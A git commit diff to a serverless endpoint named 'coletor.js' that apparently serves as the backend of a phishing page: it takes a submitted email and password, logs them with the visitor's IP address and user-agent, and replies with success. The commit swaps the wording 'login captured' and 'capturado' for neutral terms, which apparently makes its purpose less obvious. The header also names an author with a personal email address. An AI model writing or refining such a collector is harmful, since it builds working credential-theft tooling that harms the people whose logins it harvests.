86c6a85282c2451a0f83621df896616a5c5aa891
Huss873 <davidaltuniverse@gmail.com>
2025-04-16 11:02:21 -0300

    Update coletor.js

--- api/coletor.js
+++ api/coletor.js
@@ -5,19 +5,18 @@ export default async function handler(req, res) {
 
   try {
     const { email, senha } = req.body;
-
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const ua = req.headers['user-agent'];
 
-    console.log('[+] NOVO LOGIN CAPTURADO');
+    console.log('[+] NOVO LOGIN');
     console.log(`Email: ${email}`);
     console.log(`Senha: ${senha}`);
     console.log(`IP: ${ip}`);
     console.log(`User-Agent: ${ua}`);
 
-    return res.status(200).json({ message: 'capturado' });
-  } catch (error) {
-    console.error('Erro:', error);
-    return res.status(500).json({ message: 'erro interno' });
+    return res.status(200).json({ message: 'ok' });
+  } catch (err) {
+    console.error("Erro interno:", err);
+    return res.status(500).json({ message: 'internal error' });
   }
 }
